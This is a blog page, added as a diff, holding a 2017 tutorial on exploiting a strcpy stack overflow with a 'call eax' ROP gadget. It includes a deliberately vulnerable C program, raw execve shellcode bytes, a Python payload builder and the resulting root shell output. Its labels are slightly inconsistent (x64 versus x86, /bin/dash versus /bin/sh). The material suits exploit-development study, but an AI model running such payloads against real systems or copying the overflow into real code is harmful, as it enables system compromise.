@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html>
+<head>
+	<meta charset="utf-8">
+	<title>[ROP] Ret to register</title>
+	
+	<meta name="description" content="How to bypass NX/ASLR protections using "ret to register" attack on a x64 Linux system.">
+	
+	<meta name="author" content="Quentin Meffre">
+
+	<!-- Enable responsive viewport -->
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+	<!-- Le HTML5 shim, for IE6-8 support of HTML elements -->
+	<!--[if lt IE 9]>
+	<script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
+	<![endif]-->
+
+	<!-- Le styles -->
+	<link href="/assets/resources/bootstrap/css/bootstrap.min.css" rel="stylesheet">
+	<link href="/assets/resources/font-awesome/css/font-awesome.min.css" rel="stylesheet">
+	<link href="/assets/resources/syntax/syntax.css" rel="stylesheet">
+	<link href="/assets/css/style.css" rel="stylesheet">
+	<link href="/assets/css/syntax.css" rel="stylesheet">
+
+	<!-- Le fav and touch icons -->
+	<!-- Update these with your own images
+	<link rel="shortcut icon" href="images/favicon.ico">
+	<link rel="apple-touch-icon" href="images/apple-touch-icon.png">
+	<link rel="apple-touch-icon" sizes="72x72" href="images/apple-touch-icon-72x72.png">
+	<link rel="apple-touch-icon" sizes="114x114" href="images/apple-touch-icon-114x114.png">
+	-->
+
+	<link rel="alternate" type="application/rss+xml" title="" href="/feed.xml">
+</head>
+
+<body>
+	<nav class="navbar navbar-default visible-xs" role="navigation">
+		<!-- Brand and toggle get grouped for better mobile display -->
+		<div class="navbar-header">
+			<button type="button" class="navbar-toggle" data-toggle="collapse" data-target="#bs-example-navbar-collapse-1">
+				<span class="sr-only">Toggle navigation</span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+				<span class="icon-bar"></span>
+			</button>
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://github.com/https://github.com/meffre-q">
+				<i class="fa fa-github"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="http://twitter.com/https://twitter.com/0xdagger">
+				<i class="fa fa-twitter"></i>
+			</a>
+			
+			
+			<a type="button" class="navbar-toggle nav-link" href="mailto:quentin.meffre@epitech.eu">
+				<i class="fa fa-envelope"></i>
+			</a>
+			
+			<a class="navbar-brand" href="/">
+				<img src="//www.gravatar.com/avatar/?s=35" class="img-circle" />
+				quentin meffre
+			</a>
+		</div>
+
+		<!-- Collect the nav links, forms, and other content for toggling -->
+		<div class="collapse navbar-collapse" id="bs-example-navbar-collapse-1">
+			<ul class="nav navbar-nav">
+				<li class="active"><a href="/">Home</a></li>
+				<li><a href="/categories.html">Categories</a></li>
+				<li><a href="/tags.html">Tags</a></li>
+			</ul>
+		</div><!-- /.navbar-collapse -->
+	</nav>
+
+	<!-- nav-menu-dropdown -->
+	<div class="btn-group hidden-xs" id="nav-menu">
+		<button type="button" class="btn btn-default dropdown-toggle" data-toggle="dropdown">
+			<i class="fa fa-bars"></i>
+		</button>
+		<ul class="dropdown-menu" role="menu">
+			<li><a href="/"><i class="fa fa-home"></i>Home</a></li>
+			<li><a href="/categories.html"><i class="fa fa-folder"></i>Categories</a></li>
+			<li><a href="/tags.html"><i class="fa fa-tags"></i>Tags</a></li>
+			<li class="divider"></li>
+			<li><a href="#"><i class="fa fa-arrow-up"></i>Top of Page</a></li>
+		</ul>
+	</div>
+
+	<div class="col-sm-3 sidebar hidden-xs" style="">
+		<!-- sidebar.html -->
+<header class="sidebar-header" role="banner">
+	<a href="/">
+		<img src="/assets/media/XAV_1860.JPG" class="img-circle" width="180" height="250" />
+	</a>
+	<h3 class="title">
+        <a href="/">quentin meffre</a>
+    </h3>
+</header>
+
+
+<div id="bio" class="text-center">
+	Computer science student, passionate about Cyber Security.
+</div>
+
+
+<div id="contact-list" class="text-center">
+	<ul class="list-unstyled list-inline">
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://github.com/https://github.com/meffre-q">
+				<i class="fa fa-github-alt fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://twitter.com/https://twitter.com/0xdagger">
+				<i class="fa fa-twitter fa-lg"></i>
+			</a>
+		</li>
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="mailto:quentin.meffre@epitech.eu">
+				<i class="fa fa-envelope fa-lg"></i>
+			</a>
+		</li>
+		
+	</ul>
+	<ul id="contact-list-secondary" class="list-unstyled list-inline">
+		
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="https://linkedin.com/in/https://www.linkedin.com/in/quentin-meffre/">
+				<i class="fa fa-linkedin fa-lg"></i>
+			</a>
+		</li>
+		
+		<li>
+			<a class="btn btn-default btn-sm" href="/feed.xml">
+				<i class="fa fa-rss fa-lg"></i>
+			</a>
+		</li>
+	</ul>
+</div>
+<!-- sidebar.html end -->
+
+	</div>
+
+	<div class="col-sm-9 col-sm-offset-3">
+		<div class="page-header">
+  <h1>[ROP] Ret to register </h1>
+</div>
+	
+<article>
+
+	<div class="col-sm-10">
+	 <span class="post-date">
+	   
+	   January 
+	   31st,
+	     
+	   2017
+	 </span>
+	  <div class="article_body">
+	  <p>Tools:</p>
+<ol>
+  <li>objdump</li>
+  <li>ROPgadget</li>
+</ol>
+
+<p>Binary protection:</p>
+<ol>
+  <li>ASLR</li>
+</ol>
+
+<p>Compilation: Dynamic</p>
+
+<p>Architecture: x86</p>
+
+<p>Operating System: Linux (Debian)</p>
+
+<h1 id="1-explanation">1. Explanation</h1>
+<p>Today I will show you an other method to exploit Return Oriented Programming. It name is “ret to register”. Thanks to register we will be able to execute a shellcode.</p>
+
+<p>In assemby language (x86/x64) when we call a function, his return value is stored in the RAX/EAX register. For exemple, the strcpy return a pointer to the destination string. It means that if we overflow the saved “RIP/EIP” register with a gadget like “call eax/jmp eax” we will jump to the stack wich contain us shellcode !</p>
+
+<p>This method is very usefull but it needed to have the NX bit disable.</p>
+
+<h1 id="2-vulnerable-binary">2. Vulnerable binary</h1>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;string.h&gt;
+</span>
+<span class="c1">// gcc main.c -z execstack -fno-stack-protector -m32
+</span>
+<span class="kt">char</span> <span class="o">*</span><span class="nf">vuln</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">str</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
+
+  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">str</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">ac</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">av</span><span class="p">)</span>
+<span class="p">{</span>
+  <span class="n">vuln</span><span class="p">(</span><span class="n">av</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>It’s a very simple program that contain an overflow to the “strcpy” call. We will use the overflow to exploit this program.</p>
+
+<h1 id="3-the-payload">3. The payload</h1>
+<p>The payload will look like:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>+-----------------+
+|    shellcode    |
++-----------------+
+|     padding     |
++-----------------+
+|    call eax     |
++-----------------+
+</code></pre></div></div>
+
+<p>The only things we need is the “call eax” gadget, always thanks to ROPgadget:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ROPgadget <span class="nt">--binary</span> a.out | <span class="nb">grep</span> <span class="s2">"call eax"</span>
+...
+0x08048363 : call eax
+...
+</code></pre></div></div>
+
+<p>For the shellcode, I choose simple “execve(‘/bin/dash’, NULL, NULL)”, 38 bytes lenght.
+And that’s it for the payload !</p>
+
+<p>The whole payload will look:</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/usr/bin/env python2.7</span>
+
+<span class="kn">from</span> <span class="nn">struct</span> <span class="kn">import</span> <span class="n">pack</span>
+
+<span class="c">#</span>
+<span class="c"># Shellcode execve("/bin/dash", NULL, NULL) (38 bytes)</span>
+<span class="c">#</span>
+
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x18\x5e\x31\xc0\x88\x46\x07\x89\x76\x08\x89\x46\x0c\xb0\x0b\x8d\x1e\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68</span><span class="s">"</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s">'</span><span class="se">\x90</span><span class="s">'</span> <span class="o">*</span> <span class="mi">102</span> <span class="c"># Padding</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">pack</span><span class="p">(</span><span class="s">"&lt;I"</span><span class="p">,</span> <span class="mh">0x08048363</span><span class="p">)</span> <span class="c"># call eax</span>
+
+<span class="k">print</span> <span class="n">payload</span>
+</code></pre></div></div>
+
+<h1 id="4-exploitation">4. Exploitation</h1>
+<p>We test our payload:</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>./a.out <span class="k">$(</span>python rop.py<span class="k">)</span>
+id
+<span class="nv">uid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span> <span class="nv">euid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1000<span class="o">(</span>user<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Done.</p>
+
+	  </div>
+
+		
+		<ul class="tag_box list-unstyled list-inline">
+		  <li><i class="fa fa-folder-open"></i></li>
+		  
+		  
+			 
+				<li><a href="/categories.html#pwn-ref">
+					pwn <span>(4)</span>
+					
+				</a></li>
+			
+		  
+		</ul>
+		  
+
+		
+		<ul class="list-inline">
+		  <li><i class="fa fa-tags"></i></li>
+		  
+		  
+			 
+				<li>
+					<a href="/tags.html#pwn-ref">
+					pwn <span>(6)</span>
+					,
+					</a>
+				</li>
+			 
+				<li>
+					<a href="/tags.html#ROP-ref">
+					ROP <span>(3)</span>
+					
+					</a>
+				</li>
+			
+		  
+		  
+		</ul>
+		  
+
+		<hr>
+
+		<div>
+      <section class="share col-sm-6">
+        <h4 class="section-title">Share Post</h4>
+        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=[ROP] Ret to register&via=https://twitter.com/0xdagger"
+           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+          <i class="fa fa-twitter fa-lg"></i>
+          Twitter
+        </a>
+        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
+           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+          <i class="fa fa-facebook fa-lg"></i>
+          Facebook
+        </a>
+        <a class="btn btn-default btn-sm gplus"
+           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
+          <i class="fa fa-google-plus fa-lg"></i>
+          Google+
+        </a>
+      </section>
+
+      <section class="col-sm-6 author">
+        <img src="//www.gravatar.com/avatar/" class="img-rounded author-image" />
+        <h4 class="section-title author-name">Quentin Meffre</h4>
+        <p class="author-bio">Computer science student, passionate about Cyber Security.</p>
+      </section>
+    </div>
+
+    <div class="clearfix"></div>
+
+		<ul class="pager">
+		  
+		  <li class="previous"><a href="/pwn/2017/01/29/ret_to_libc.html" title="[ROP] Ret to LibC">&larr; Previous</a></li>
+		  
+		  
+		  <li class="next"><a href="/pwn/2017/05/14/aslr_bruteforce.html" title="ASLR Bruteforce">Next &rarr;</a></li>
+		  
+		</ul>
+
+		<hr>
+	</div>
+	
+	<div class="col-sm-2 sidebar-2">
+	
+	</div>
+</article>
+<div class="clearfix"></div>
+
+
+
+
+
+		<footer>
+			<hr/>
+			<p>
+				&copy; 2017 Quentin Meffre with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
+			</p>
+		</footer>
+	</div>
+
+	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
+	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
+	<script type="text/javascript" src="/assets/js/app.js"></script>
+</body>
+</html>
+
+
+
+<!-- Asynchronous Google Analytics snippet -->
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-90952644-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
